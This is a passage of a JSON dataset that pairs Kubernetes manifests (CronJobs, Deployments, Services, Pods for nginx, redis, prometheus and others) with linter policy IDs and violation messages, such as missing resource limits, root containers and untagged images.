\\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-maskrcnn-func-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"train\" has memory limit 0"
  },
  {
    "id": "2451",
    "manifest_path": "data/manifests/the_stack_sample/sample_0645.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: example-job-every-quarter\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-job\n      spec:\n        containers:\n        - name: job\n          image: luksa/batch-job\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"job\" is using an invalid container image, \"luksa/batch-job\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2452",
    "manifest_path": "data/manifests/the_stack_sample/sample_0645.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: example-job-every-quarter\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-job\n      spec:\n        containers:\n        - name: job\n          image: luksa/batch-job\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"job\" does not have a read-only root file system"
  },
  {
    "id": "2453",
    "manifest_path": "data/manifests/the_stack_sample/sample_0645.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: example-job-every-quarter\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-job\n      spec:\n        containers:\n        - name: job\n          image: luksa/batch-job\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"job\" is not set to runAsNonRoot"
  },
  {
    "id": "2454",
    "manifest_path": "data/manifests/the_stack_sample/sample_0645.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: example-job-every-quarter\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-job\n      spec:\n        containers:\n        - name: job\n          image: luksa/batch-job\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"job\" has cpu request 0"
  },
  {
    "id": "2455",
    "manifest_path": "data/manifests/the_stack_sample/sample_0645.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: example-job-every-quarter\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        labels:\n          app: periodic-job\n      spec:\n        containers:\n        - name: job\n          image: luksa/batch-job\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"job\" has memory limit 0"
  },
  {
    "id": "2456",
    "manifest_path": "data/manifests/the_stack_sample/sample_0647.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.10\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 6d3939d6f6959c729794e49116e266b7584fcbf15dbabd0db30f725dad149252\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.10\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: dineshgitbot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.10\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 8f23a5446f6f026f5395d53298638faec245136e\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "2457",
    "manifest_path": "data/manifests/the_stack_sample/sample_0647.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.10\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 6d3939d6f6959c729794e49116e266b7584fcbf15dbabd0db30f725dad149252\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.10\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: dineshgitbot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.10\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 8f23a5446f6f026f5395d53298638faec245136e\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-foghorn\" not found"
  },
  {
    "id": "2458",
    "manifest_path": "data/manifests/the_stack_sample/sample_0647.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.5.10\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: 6d3939d6f6959c729794e49116e266b7584fcbf15dbabd0db30f725dad149252\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.5.10\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: dineshgitbot\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.5.10\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 8f23a5446f6f026f5395d53298638faec245136e\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-foghorn\" is not set to runAsNonRoot"
  },
  {
    "id": "2459",
    "manifest_path": "data/manifests/the_stack_sample/sample_0648.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    kompose.cmd: kompose convert\n    kompose.version: 1.22.0 (955b78124)\n  labels:\n    io.kompose.service: rabbitmq\n  name: rabbitmq\nspec:\n  ports:\n  - name: '5672'\n    port: 5672\n    targetPort: 5672\n    nodePort: 5672\n  - name: '15672'\n    port: 15672\n    targetPort: 15672\n    nodePort: 15672\n  type: NodePort\n  selector:\n    io.kompose.service: rabbitmq\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[io.kompose.service:rabbitmq])"
  },
  {
    "id": "2460",
    "manifest_path": "data/manifests/the_stack_sample/sample_0649.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: cassandra\n  name: cassandra\nspec:\n  clusterIP: None\n  ports:\n  - port: 9042\n  selector:\n    app: cassandra\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:cassandra])"
  },
  {
    "id": "2461",
    "manifest_path": "data/manifests/the_stack_sample/sample_0650.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        version: '3'\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"prometheus\" is using an invalid container image, \"prom/prometheus\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2462",
    "manifest_path": "data/manifests/the_stack_sample/sample_0650.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        version: '3'\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"prometheus\" does not have a read-only root file system"
  },
  {
    "id": "2463",
    "manifest_path": "data/manifests/the_stack_sample/sample_0650.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        version: '3'\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus\" is not set to runAsNonRoot"
  },
  {
    "id": "2464",
    "manifest_path": "data/manifests/the_stack_sample/sample_0650.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        version: '3'\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prometheus\" has cpu request 0"
  },
  {
    "id": "2465",
    "manifest_path": "data/manifests/the_stack_sample/sample_0650.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: prometheus\n  namespace: monitoring\n  labels:\n    app: prometheus\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prometheus\n  template:\n    metadata:\n      labels:\n        app: prometheus\n        version: '3'\n      annotations:\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      containers:\n      - name: prometheus\n        image: prom/prometheus\n        args:\n        - --storage.tsdb.retention=6h\n        - --storage.tsdb.path=/prometheus\n        - --config.file=/etc/prometheus/prometheus.yml\n        ports:\n        - name: web\n          containerPort: 9090\n        volumeMounts:\n        - name: prometheus-config-volume\n          mountPath: /etc/prometheus\n        - name: prometheus-storage-volume\n          mountPath: /prometheus\n      volumes:\n      - name: prometheus-config-volume\n        configMap:\n          defaultMode: 420\n          name: prometheus-config\n      - name: prometheus-storage-volume\n        persistentVolumeClaim:\n          claimName: pvc-nfs-data\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus\" has memory limit 0"
  },
  {
    "id": "2466",
    "manifest_path": "data/manifests/the_stack_sample/sample_0653.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6008\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2467",
    "manifest_path": "data/manifests/the_stack_sample/sample_0653.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6008\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2468",
    "manifest_path": "data/manifests/the_stack_sample/sample_0653.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6008\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2469",
    "manifest_path": "data/manifests/the_stack_sample/sample_0653.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6008\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2470",
    "manifest_path": "data/manifests/the_stack_sample/sample_0653.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-6008\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2471",
    "manifest_path": "data/manifests/the_stack_sample/sample_0655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard-not-secure\n  name: kubernetes-dashboard-not-secure\n  namespace: kubernetes-dashboard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kubernetes-dashboard-not-secure\n  template:\n    metadata:\n      labels:\n        k8s-app: kubernetes-dashboard-not-secure\n    spec:\n      containers:\n      - name: kubernetes-dashboard-not-secure\n        image: kubernetesui/dashboard:v2.0.0-beta8\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 9090\n          protocol: TCP\n        args:\n        - --namespace=kubernetes-dashboard\n        - --enable-insecure-login=true\n        volumeMounts:\n        - name: kubernetes-dashboard-certs\n          mountPath: /certs\n        - mountPath: /tmp\n          name: tmp-volume\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /\n            port: 9090\n          initialDelaySeconds: 30\n          timeoutSeconds: 30\n      volumes:\n      - name: kubernetes-dashboard-certs\n        secret:\n          secretName: kubernetes-dashboard-certs\n      - name: tmp-volume\n        emptyDir: {}\n      serviceAccountName: kubernetes-dashboard\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kubernetes-dashboard-not-secure\" does not have a read-only root file system"
  },
  {
    "id": "2472",
    "manifest_path": "data/manifests/the_stack_sample/sample_0655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard-not-secure\n  name: kubernetes-dashboard-not-secure\n  namespace: kubernetes-dashboard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kubernetes-dashboard-not-secure\n  template:\n    metadata:\n      labels:\n        k8s-app: kubernetes-dashboard-not-secure\n    spec:\n      containers:\n      - name: kubernetes-dashboard-not-secure\n        image: kubernetesui/dashboard:v2.0.0-beta8\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 9090\n          protocol: TCP\n        args:\n        - --namespace=kubernetes-dashboard\n        - --enable-insecure-login=true\n        volumeMounts:\n        - name: kubernetes-dashboard-certs\n          mountPath: /certs\n        - mountPath: /tmp\n          name: tmp-volume\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /\n            port: 9090\n          initialDelaySeconds: 30\n          timeoutSeconds: 30\n      volumes:\n      - name: kubernetes-dashboard-certs\n        secret:\n          secretName: kubernetes-dashboard-certs\n      - name: tmp-volume\n        emptyDir: {}\n      serviceAccountName: kubernetes-dashboard\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"kubernetes-dashboard\" not found"
  },
  {
    "id": "2473",
    "manifest_path": "data/manifests/the_stack_sample/sample_0655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard-not-secure\n  name: kubernetes-dashboard-not-secure\n  namespace: kubernetes-dashboard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kubernetes-dashboard-not-secure\n  template:\n    metadata:\n      labels:\n        k8s-app: kubernetes-dashboard-not-secure\n    spec:\n      containers:\n      - name: kubernetes-dashboard-not-secure\n        image: kubernetesui/dashboard:v2.0.0-beta8\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 9090\n          protocol: TCP\n        args:\n        - --namespace=kubernetes-dashboard\n        - --enable-insecure-login=true\n        volumeMounts:\n        - name: kubernetes-dashboard-certs\n          mountPath: /certs\n        - mountPath: /tmp\n          name: tmp-volume\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /\n            port: 9090\n          initialDelaySeconds: 30\n          timeoutSeconds: 30\n      volumes:\n      - name: kubernetes-dashboard-certs\n        secret:\n          secretName: kubernetes-dashboard-certs\n      - name: tmp-volume\n        emptyDir: {}\n      serviceAccountName: kubernetes-dashboard\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kubernetes-dashboard-not-secure\" is not set to runAsNonRoot"
  },
  {
    "id": "2474",
    "manifest_path": "data/manifests/the_stack_sample/sample_0655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard-not-secure\n  name: kubernetes-dashboard-not-secure\n  namespace: kubernetes-dashboard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kubernetes-dashboard-not-secure\n  template:\n    metadata:\n      labels:\n        k8s-app: kubernetes-dashboard-not-secure\n    spec:\n      containers:\n      - name: kubernetes-dashboard-not-secure\n        image: kubernetesui/dashboard:v2.0.0-beta8\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 9090\n          protocol: TCP\n        args:\n        - --namespace=kubernetes-dashboard\n        - --enable-insecure-login=true\n        volumeMounts:\n        - name: kubernetes-dashboard-certs\n          mountPath: /certs\n        - mountPath: /tmp\n          name: tmp-volume\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /\n            port: 9090\n          initialDelaySeconds: 30\n          timeoutSeconds: 30\n      volumes:\n      - name: kubernetes-dashboard-certs\n        secret:\n          secretName: kubernetes-dashboard-certs\n      - name: tmp-volume\n        emptyDir: {}\n      serviceAccountName: kubernetes-dashboard\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"kubernetes-dashboard-not-secure\" has cpu request 0"
  },
  {
    "id": "2475",
    "manifest_path": "data/manifests/the_stack_sample/sample_0655.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    k8s-app: kubernetes-dashboard-not-secure\n  name: kubernetes-dashboard-not-secure\n  namespace: kubernetes-dashboard\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kubernetes-dashboard-not-secure\n  template:\n    metadata:\n      labels:\n        k8s-app: kubernetes-dashboard-not-secure\n    spec:\n      containers:\n      - name: kubernetes-dashboard-not-secure\n        image: kubernetesui/dashboard:v2.0.0-beta8\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 9090\n          protocol: TCP\n        args:\n        - --namespace=kubernetes-dashboard\n        - --enable-insecure-login=true\n        volumeMounts:\n        - name: kubernetes-dashboard-certs\n          mountPath: /certs\n        - mountPath: /tmp\n          name: tmp-volume\n        livenessProbe:\n          httpGet:\n            scheme: HTTP\n            path: /\n            port: 9090\n          initialDelaySeconds: 30\n          timeoutSeconds: 30\n      volumes:\n      - name: kubernetes-dashboard-certs\n        secret:\n          secretName: kubernetes-dashboard-certs\n      - name: tmp-volume\n        emptyDir: {}\n      serviceAccountName: kubernetes-dashboard\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kubernetes-dashboard-not-secure\" has memory limit 0"
  },
  {
    "id": "2476",
    "manifest_path": "data/manifests/the_stack_sample/sample_0657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: voting-app\n  labels:\n    app: voting-app\n    name: redis-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: voting-app\n      name: redis-pod\n  template:\n    metadata:\n      labels:\n        app: voting-app\n        name: redis-pod\n    spec:\n      containers:\n      - image: redis\n        name: redis\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2477",
    "manifest_path": "data/manifests/the_stack_sample/sample_0657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: voting-app\n  labels:\n    app: voting-app\n    name: redis-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: voting-app\n      name: redis-pod\n  template:\n    metadata:\n      labels:\n        app: voting-app\n        name: redis-pod\n    spec:\n      containers:\n      - image: redis\n        name: redis\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "2478",
    "manifest_path": "data/manifests/the_stack_sample/sample_0657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: voting-app\n  labels:\n    app: voting-app\n    name: redis-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: voting-app\n      name: redis-pod\n  template:\n    metadata:\n      labels:\n        app: voting-app\n        name: redis-pod\n    spec:\n      containers:\n      - image: redis\n        name: redis\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "2479",
    "manifest_path": "data/manifests/the_stack_sample/sample_0657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: voting-app\n  labels:\n    app: voting-app\n    name: redis-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: voting-app\n      name: redis-pod\n  template:\n    metadata:\n      labels:\n        app: voting-app\n        name: redis-pod\n    spec:\n      containers:\n      - image: redis\n        name: redis\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "2480",
    "manifest_path": "data/manifests/the_stack_sample/sample_0657.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis\n  namespace: voting-app\n  labels:\n    app: voting-app\n    name: redis-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: voting-app\n      name: redis-pod\n  template:\n    metadata:\n      labels:\n        app: voting-app\n        name: redis-pod\n    spec:\n      containers:\n      - image: redis\n        name: redis\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"redis\" has memory limit 0"
  },
  {
    "id": "2481",
    "manifest_path": "data/manifests/the_stack_sample/sample_0659.yaml",
